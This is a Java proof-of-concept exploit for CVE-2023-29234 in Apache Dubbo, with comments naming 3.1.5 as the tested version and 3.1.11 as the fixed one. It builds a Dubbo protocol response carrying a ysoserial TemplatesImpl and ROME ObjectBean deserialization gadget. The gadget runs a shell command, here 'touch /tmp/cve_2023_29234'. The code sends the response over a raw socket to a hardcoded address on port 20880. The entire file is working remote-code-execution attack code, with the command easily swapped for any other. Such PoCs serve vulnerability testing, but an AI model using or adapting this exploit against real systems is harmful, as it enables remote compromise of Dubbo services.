package dubbo.cve;

import com.rometools.rome.feed.impl.ObjectBean;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Serialization;
import org.apache.dubbo.common.serialize.nativejava.NativeJavaObjectOutput;
import org.apache.dubbo.common.serialize.nativejava.NativeJavaSerialization;
import org.apache.dubbo.remoting.exchange.Response;
import ysoserial.payloads.util.Gadgets;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.Socket;
/**
 * 测试版本：dubbo 3.1.5
 * 修复版本：dubbo 3.1.11
 */
public class CVE_2023_29234 {

    static byte RESPONSE_WITH_EXCEPTION = 0;
    protected static final int HEADER_LENGTH = 16;
    // magic header.
    protected static final short MAGIC = (short) 0xdabb;
    protected static final byte MAGIC_HIGH = Bytes.short2bytes(MAGIC)[0];
    protected static final byte MAGIC_LOW = Bytes.short2bytes(MAGIC)[1];
    // message flag.
    protected static final byte FLAG_REQUEST = (byte) 0x80;
    protected static final byte FLAG_TWOWAY = (byte) 0x40;
    protected static final byte FLAG_EVENT = (byte) 0x20;
    protected static final int SERIALIZATION_MASK = 0x1f;

    protected static Object getThrowablePayload(String command) throws Exception {
        Object o = Gadgets.createTemplatesImpl(command);
        ObjectBean delegate = new ObjectBean(Templates.class, o);

        return delegate;
    }

    public static void main(String[] args) throws Exception {

        ByteArrayOutputStream boos = new ByteArrayOutputStream();
        ByteArrayOutputStream nativeJavaBoos = new ByteArrayOutputStream();
        Serialization serialization = new NativeJavaSerialization();
        NativeJavaObjectOutput out = new NativeJavaObjectOutput(nativeJavaBoos);

        // header.
        byte[] header = new byte[HEADER_LENGTH];
        // set magic number.
        Bytes.short2bytes(MAGIC, header);
        // set request and serialization flag.
        header[2] = serialization.getContentTypeId();

        header[3] = Response.OK;
        Bytes.long2bytes(1, header, 4);

        Object exp = getThrowablePayload("touch /tmp/cve_2023_29234");
        out.writeByte(RESPONSE_WITH_EXCEPTION);
        out.writeObject(exp);

        out.flushBuffer();

        Bytes.int2bytes(nativeJavaBoos.size(), header, 12);
        boos.write(header);
        boos.write(nativeJavaBoos.toByteArray());

        byte[] responseData = boos.toByteArray();

        Socket socket = new Socket("10.58.120.200", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(responseData);
        outputStream.flush();
        outputStream.close();
    }

}
